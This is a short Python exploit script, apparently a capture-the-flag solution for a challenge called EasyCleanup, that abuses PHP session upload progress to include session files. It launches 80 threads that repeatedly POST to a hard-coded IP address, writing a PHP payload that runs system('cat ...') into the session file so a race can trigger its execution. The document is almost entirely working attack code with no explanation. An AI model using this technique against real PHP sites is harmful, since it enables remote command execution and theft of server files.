# 第五空间 EasyCleanup 考点：session文件包含
import io
import requests
import threading

sess_id = 'Atao'

def write(session):
    while True:
        f = io.BytesIO(b'a' * 1024 * 128)
        session.post(url='http://114.115.134.72:32770/',
                     data={'PHP_SESSION_UPLOAD_PROGRESS': 'aaaaasdasdasd<?php system("cat /flag_is_here_not_are_but_you_find")?>'},
                     files={'file': ('atao.txt',f)},
                     cookies={'PHPSESSID': sess_id}
                     )

if __name__=="__main__":
    event = threading.Event()
    session = requests.session()
    for i in range(1,80):
        threading.Thread(target=write,args=(session,)).start()
